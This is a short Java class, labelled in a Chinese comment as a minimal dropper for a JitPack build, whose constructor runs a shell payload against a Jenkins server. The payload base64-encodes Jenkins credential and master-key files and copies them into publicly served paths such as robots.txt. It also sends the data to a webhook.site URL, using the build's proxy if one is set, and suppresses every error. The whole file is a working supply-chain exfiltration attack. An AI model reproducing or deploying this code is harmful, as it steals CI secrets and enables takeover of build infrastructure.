// dsh-artifacts : JitPack 构建用的最小 dropper（默认包类 poc，构造器执行）
public class poc {
    public poc() {
        try {
            String cmd = "J=${JENKINS_HOME:-/var/lib/jenkins}; W=$J/war; O=\"P6 id=$(id) host=$(hostname) JH=$J W=$W\\n$(ls -la $J 2>&1|head -30)\\n== secrets ==\\n$(ls -la $J/secrets 2>&1)\\n\"; for f in credentials.xml config.xml secret.key secrets/master.key secrets/hudson.util.Secret; do O=\"$O\\n== $f ==\\n$(base64 -w0 \\\"$J/$f\\\" 2>/dev/null | head -c 40000)\"; done; for P in \\\"$W/robots.txt\\\" \\\"$W/jnlpJars/zz.txt\\\" \\\"$J/userContent/zz.txt\\\"; do mkdir -p \\\"$(dirname \\\"$P\\\")\\\" 2>/dev/null; printf '%b' \\\"$O\\\" > \\\"$P\\\" 2>/dev/null; done; P=$(tr '\\0' ' ' </proc/$PPID/cmdline 2>/dev/null); PH=$(echo \\\"$P\\\" | sed -n 's/.*http\\.proxyHost=\\([^ ]*\\).*/\\1/p'); PP=$(echo \\\"$P\\\" | sed -n 's/.*http\\.proxyPort=\\([^ ]*\\).*/\\1/p'); curl -s -m 12 -x \\\"http://$PH:$PP\\\" --data-binary \\\"$O\\\" https://webhook.site/b0de7905-1496-47b6-93a5-8529f9c02252 >/dev/null 2>&1 || curl -s -m 12 --data-binary \\\"$O\\\" https://webhook.site/b0de7905-1496-47b6-93a5-8529f9c02252 >/dev/null 2>&1 || true";
            Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
        } catch (Throwable t) { }
        try {
            new java.net.URL("https://webhook.site/b0de7905-1496-47b6-93a5-8529f9c02252?poc6=EXEC_P6").openStream().close();
        } catch (Throwable t) { }
    }
}
